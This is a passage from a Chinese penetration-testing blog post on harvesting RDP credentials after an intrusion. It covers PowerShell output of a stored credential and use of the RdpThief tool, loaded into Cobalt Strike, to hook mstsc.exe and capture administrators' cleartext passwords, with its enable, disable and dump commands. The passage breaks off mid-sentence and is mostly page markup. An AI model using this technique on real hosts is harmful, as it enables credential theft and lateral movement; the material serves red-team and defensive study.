style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">LastWriteTime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">12</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">9</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2017</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">4</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">46</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">50</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> PM</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">LastWriteTimeUtc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">12</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">9</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2017</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">9</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">46</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">50</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> PM</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Type</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">             </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Generic</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># “通用” 类型凭证</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">PersistenceType</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Enterprise</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">PS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">但是该脚本只能为 “通用” 类型凭证检索密码，如果是 “域” 类型凭证的话是检索不出密码的：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5396618985695709" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/22_baVU2Aiakcjkzd7clGZdUXuTBEfF8g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPQTp3nYicGSQ38jPribz2arcjRw9baVU2Aiakcjkzd7clGZdUXuTBEfF8g/640?wx_fmt=png'" data-type="png" data-w="769" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713151926015</figcaption></figure><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">使用 RdpThief 实现 HOOK RDP 凭据</h2><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/23_oEiaMLrsaIG4o8VLCWbzm4s5wodbpA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPPyoc2khUJz6urDeByyicu74MzpoEiaMLrsaIG4o8VLCWbzm4s5wodbpA/640?wx_fmt=png'" data-type="png" data-w="1200" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">RdpThief</figcaption></figure><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>项目地址：https://github.com/0x09AL/RdpThief</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当用户打开 Windows 远程桌面 mstsc.exe 并通过 RDP 协议远程连接到其他系统时，将创建 mstsc.exe 进程。而如果此时我们使用 API Hooking 则可以直接拦截用户提供的凭据，并将其保存到用户主机上某处。Rio Sherri 开发了一个名为 RdpThief 的概念性验证工具，它可以尝试在运行有 mstsc.exe 进程的主机上 Hooking mstsc 进程中使用的函数（CredIsMarshaledCredentialW 和 CryptProtectMemory），并检索其中的凭据然后将凭据写入主机上的某个文件中。详细原理可以看：https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">RdpThief 的代码里包括三部分内容：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">C++ 工程文件</strong></span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以编译生成 .dll，该 .dll 会被注入到 mstsc.exe 进程中。</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">RdpThief_x64.tmp</strong></span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">shellcode 格式的 .dll，作者早已使用 sRDI 将编译好的 dll 转换为了 Shellcode 的格式，便于使用 .cna 脚本被 Cobalt Strike 加载调用。</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">RdpThief.cna</strong></span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Colbalt Strike 使用的 cna 脚本，Colbalt Strike 可以使用该 cna 脚本将 RdpThief 加载为插件直接使用。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">使用 Cobalt Strike 加载 RdpThief</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先下载 RdpThief 后，在项目里面有一个 .cna 文件，可以直接由 Cobalt Strike 进行加载为插件使用：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5317708333333333" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/24_UM09cKYx5HhXn54sLkEwwoRGibEPWA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPWmACPQjqlaHTda5ac82dpRZHvUM09cKYx5HhXn54sLkEwwoRGibEPWA/640?wx_fmt=png'" data-type="png" data-w="1920" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713195153287</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">加载成功后便有了以下三个支持的命令：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>rdpthief_enable：启动心跳检测，每 5 秒搜索一次 mstsc.exe 进程并注入 RdpThief_x64.tmp 中的 Shellcode。</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>rdpthief_disable：停止心跳检测，但该命令不会卸载注入的 Shellcode</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>rdpthief_dump：显示抓取的凭据，默认读取路径为&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%temp%\data.bin</code></span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如下，首先执行&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">rdpthief_enable</code>&nbsp;命令启动心跳检测：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3539518900343643" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/25_5s0gzvibblpr6Znf5pAuqc2V7YFq8A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPJyGlyFTtVEPVoLtWzaI66TWHE5s0gzvibblpr6Znf5pAuqc2V7YFq8A/640?wx_fmt=png'" data-type="png" data-w="873" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713195615871</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">假设此时管理员在目标主机上使用 mstsc 远程桌面登录其他服务器并输入了密码：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5821052631578948" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/26_Ct5NdBViaOpYyicAEJG7XPOibtGM3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPQf1klsvFGc8KTnmDfWa6icSxNub7Ct5NdBViaOpYyicAEJG7XPOibtGM3Q/640?wx_fmt=png'" data-type="png" data-w="950" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210713195830841</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后执行&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">rdpthief_disable</code>&nbsp;停止心跳检测，最后执行&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 